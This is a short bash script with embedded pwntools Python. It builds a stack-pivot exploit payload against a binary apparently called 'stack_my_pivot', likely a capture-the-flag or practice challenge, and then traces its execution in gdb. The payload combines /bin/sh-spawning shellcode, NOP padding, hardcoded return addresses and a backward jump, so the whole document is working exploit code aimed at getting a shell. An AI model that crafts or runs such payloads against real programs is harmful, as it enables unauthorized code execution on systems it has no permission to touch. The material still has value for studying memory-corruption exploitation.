#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')

second_input = b'\x90' * 8
second_input += p64(0x400738)
second_input += b'\xeb\xa6'
second_input += b'\x90' * (23 - len(second_input))
second_input += p32(0x40072e)
second_input += b'\x90'

with open('/tmp/final_input', 'wb') as f:
    f.write(first_input + second_input)
EOF

gdb -batch \
  -ex 'break *0x400738' \
  -ex 'run < /tmp/final_input' \
  -ex 'info registers rsp rip' \
  -ex 'x/10i $rip' \
  -ex 'x/20gx $rsp-16' \
  -ex 'stepi' \
  -ex 'info registers rsp rip' \
  -ex 'x/10i $rip' \
  ./stack_my_pivot 2>&1 | tail -80
